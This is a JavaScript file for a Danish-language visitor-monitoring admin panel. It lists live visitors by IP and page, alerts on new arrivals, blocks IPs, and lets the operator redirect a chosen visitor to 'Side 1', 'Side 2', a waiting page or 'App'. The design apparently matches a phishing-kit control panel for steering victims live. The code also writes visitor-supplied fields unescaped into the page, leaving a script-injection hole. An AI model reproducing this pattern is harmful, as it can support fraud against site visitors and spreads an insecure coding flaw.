// Admin Panel Dynamique
let currentVisitors = [];
let searchTerm = '';
let autoRefreshInterval = null;
let lastVisitorCount = 0;

// Charger les données
async function loadData() {
    try {
        const response = await fetch('api/get_visitors.php');
        const data = await response.json();
        
        if (data.success) {
            // Vérifier s'il y a de nouveaux visiteurs
            if (data.visitors.length > lastVisitorCount && lastVisitorCount > 0) {
                showNotification('🎉 Nouveau visiteur détecté!');
                playNotificationSound();
            }
            
            lastVisitorCount = data.visitors.length;
            currentVisitors = data.visitors;
            
            updateStats(data.stats);
            renderVisitors(data.visitors);
            updateLastUpdateTime();
        }
    } catch (error) {
        console.error('Erreur lors du chargement des données:', error);
    }
}

// Mettre à jour les statistiques
function updateStats(stats) {
    document.getElementById('stat-total').textContent = stats.total;
    document.getElementById('stat-online').textContent = stats.online;
    document.getElementById('stat-waiting').textContent = stats.waiting;
    document.getElementById('stat-offline').textContent = stats.offline;
    document.getElementById('stat-blocked').textContent = stats.blocked;
    
    // Animation des chiffres
    animateValue('stat-total', 0, stats.total, 500);
    animateValue('stat-online', 0, stats.online, 500);
    animateValue('stat-waiting', 0, stats.waiting, 500);
    animateValue('stat-offline', 0, stats.offline, 500);
    animateValue('stat-blocked', 0, stats.blocked, 500);
}

// Animer les valeurs
function animateValue(id, start, end, duration) {
    const element = document.getElementById(id);
    const range = end - start;
    const increment = range / (duration / 16);
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        if ((increment > 0 && current >= end) || (increment < 0 && current <= end)) {
            current = end;
            clearInterval(timer);
        }
        element.textContent = Math.floor(current);
    }, 16);
}

// Afficher les visiteurs
function renderVisitors(visitors) {
    const container = document.getElementById('visitorsGrid');
    
    // Filtrer par recherche
    const filteredVisitors = visitors.filter(v => 
        v.ip.toLowerCase().includes(searchTerm.toLowerCase())
    );
    
    if (filteredVisitors.length === 0) {
        container.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">Ingen besøgende fundet</p>';
        return;
    }
    
    container.innerHTML = filteredVisitors.map(visitor => `
        <div class="visitor-card ${visitor.status}" data-ip="${visitor.ip}">
            <div class="visitor-ip">
                🌐 ${visitor.ip}
                ${visitor.blocked ? '<span class="blocked-badge">BLOKERET</span>' : ''}
            </div>
            
            <span class="visitor-status status-${visitor.status}">
                ${getStatusIcon(visitor.status)} ${getStatusText(visitor.status)}
            </span>
            
            <div class="visitor-page">
                📄 Nuværende side: <strong>${visitor.page}</strong>
            </div>
            
            ${visitor.source ? `
                <div class="visitor-source">
                    🔗 Kilde: <strong>${visitor.source}</strong>
                </div>
            ` : ''}
            
            <div class="visitor-actions">
                ${visitor.blocked ? `
                    <button class="action-btn unblock" onclick="toggleBlock('${visitor.ip}', 'unblock')">
                        ✓ Fjern blokering
                    </button>
                ` : `
                    <button class="action-btn block" onclick="toggleBlock('${visitor.ip}', 'block')">
                        🚫 Bloker IP
                    </button>
                `}
            </div>
            
            <div class="redirect-buttons">
                <button class="redirect-btn btn-page1" onclick="redirect('${visitor.ip}', 'page1')">
                    ➡️ Side 1
                </button>
                <button class="redirect-btn btn-page2" onclick="redirect('${visitor.ip}', 'page2')">
                    ➡️ Side 2
                </button>
                <button class="redirect-btn btn-waiting" onclick="redirect('${visitor.ip}', 'waiting')">
                    ⏸️ Vente
                </button>
                <button class="redirect-btn btn-app" onclick="redirect('${visitor.ip}', 'app')">
                    ➡️ App
                </button>
            </div>
        </div>
    `).join('');
}

// Obtenir l'icône de statut
function getStatusIcon(status) {
    switch(status) {
        case 'online': return '🟢';
        case 'waiting': return '🟤';
        case 'offline': return '⚪';
        default: return '⚪';
    }
}

// Obtenir le texte de statut
function getStatusText(status) {
    switch(status) {
        case 'online': return 'Online';
        case 'waiting': return 'Venter';
        case 'offline': return 'Offline';
        default: return 'Ukendt';
    }
}

// Rediriger un visiteur
async function redirect(ip, page) {
    showLoading();
    
    try {
        const response = await fetch('api/set_redirect.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ip, page })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showNotification(`✓ Omdirigering sat for IP: ${ip} til ${page}`);
            await loadData();
        } else {
            showNotification('❌ Fejl ved indstilling af omdirigering', 'error');
        }
    } catch (error) {
        showNotification('❌ Netværksfejl', 'error');
    } finally {
        hideLoading();
    }
}

// Bloquer/Débloquer une IP
async function toggleBlock(ip, action) {
    const actionText = action === 'block' ? 'blokere' : 'fjerne blokering for';
    
    if (!confirm(`Er du sikker på, at du vil ${actionText} IP: ${ip}?`)) {
        return;
    }
    
    showLoading();
    
    try {
        const response = await fetch('api/block_ip.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ip, action })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showNotification(`✓ IP ${ip} er blevet ${action === 'block' ? 'blokeret' : 'fjernet fra blokeringsliste'}`);
            await loadData();
        } else {
            showNotification('❌ Fejl ved ' + actionText + ' IP', 'error');
        }
    } catch (error) {
        showNotification('❌ Netværksfejl', 'error');
    } finally {
        hideLoading();
    }
}

// Afficher une notification
function showNotification(message, type = 'success') {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.style.backgroundColor = type === 'error' ? '#dc3545' : '#28a745';
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Jouer un son de notification
function playNotificationSound() {
    // Créer un son simple avec Web Audio API
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 800;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
}

// Afficher le chargement
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
}

// Masquer le chargement
function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}

// Rafraîchir les données
async function refreshData() {
    showLoading();
    await loadData();
    hideLoading();
    showNotification('✓ Data opdateret');
}

// Toggle Dark Mode
function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const isDark = document.body.classList.contains('dark-mode');
    localStorage.setItem('darkMode', isDark);
    showNotification(isDark ? '🌙 Dark Mode aktiveret' : '☀️ Light Mode aktiveret');
}

// Exporter vers CSV
function exportToCSV() {
    const headers = ['IP', 'Status', 'Page', 'Source', 'Blokeret'];
    const rows = currentVisitors.map(v => [
        v.ip,
        v.status,
        v.page,
        v.source || 'Direct',
        v.blocked ? 'Ja' : 'Nej'
    ]);
    
    let csv = headers.join(',') + '\n';
    csv += rows.map(row => row.join(',')).join('\n');
    
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `visitors_${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    
    showNotification('✓ CSV eksporteret');
}

// Mettre à jour l'heure de dernière mise à jour
function updateLastUpdateTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString('da-DK');
    document.getElementById('lastUpdate').textContent = `Sidst opdateret: ${timeString}`;
}

// Recherche
document.addEventListener('DOMContentLoaded', function() {
    const searchInput = document.getElementById('searchInput');
    
    searchInput.addEventListener('input', function(e) {
        searchTerm = e.target.value;
        renderVisitors(currentVisitors);
    });
    
    // Charger le mode sombre depuis localStorage
    const isDarkMode = localStorage.getItem('darkMode') === 'true';
    if (isDarkMode) {
        document.body.classList.add('dark-mode');
    }
    
    // Charger les données initiales
    loadData();
    
    // Auto-refresh toutes les 5 secondes
    autoRefreshInterval = setInterval(loadData, 5000);
});

// Nettoyer l'intervalle quand on quitte la page
window.addEventListener('beforeunload', function() {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
    }
});
